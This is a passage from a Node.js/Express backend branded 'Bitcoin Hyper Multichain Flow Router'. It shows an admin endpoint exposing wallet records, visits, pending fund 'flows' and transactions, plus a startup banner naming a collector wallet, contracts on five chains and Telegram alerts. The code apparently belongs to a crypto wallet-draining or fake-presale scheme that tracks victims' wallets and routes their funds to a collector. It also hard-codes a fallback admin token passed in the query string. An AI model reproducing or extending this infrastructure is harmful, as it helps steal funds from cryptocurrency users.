app.get('/api/admin/wallet/:address', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const walletAddress = req.params.address.toLowerCase();
  
  const participant = memoryStorage.participants.find(p => p.walletAddress === walletAddress);
  const visits = memoryStorage.siteVisits.filter(v => v.walletAddress === walletAddress);
  const flows = Array.from(memoryStorage.pendingFlows.values())
    .filter(f => f.walletAddress === walletAddress);
  
  if (!participant) {
    return res.json({ 
      success: true, 
      found: false,
      message: 'Wallet not found in database'
    });
  }
  
  res.json({
    success: true,
    found: true,
    wallet: {
      ...participant,
      connectedAt: participant.connectedAt?.toISOString(),
      lastScanned: participant.lastScanned?.toISOString(),
      claimedAt: participant.claimedAt?.toISOString()
    },
    visits,
    flows,
    transactions: memoryStorage.settings.statistics.processedTransactions
      .filter(t => t.wallet.toLowerCase() === walletAddress)
  });
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found' });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ BITCOIN HYPER BACKEND - MULTICHAIN FLOW ROUTER
  ================================================
  📍 Port: ${PORT}
  🔗 URL: https://bthbk.vercel.app
  
  📦 COLLECTOR: ${COLLECTOR_WALLET}
  
  🌐 DEPLOYED CONTRACTS:
  ✅ Ethereum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
  ✅ BSC: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
  ✅ Polygon: 0x56d829E89634Ce1426B73571c257623D17db46cB
  ✅ Arbitrum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
  ✅ Avalanche: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
  
  🤖 TELEGRAM STATUS: ${telegramEnabled ? '✅ Connected' : '❌ Disabled - Check .env file'}
  
  🚀 READY FOR MULTICHAIN FLOWS
  `);
  
  await testTelegramConnection();
});
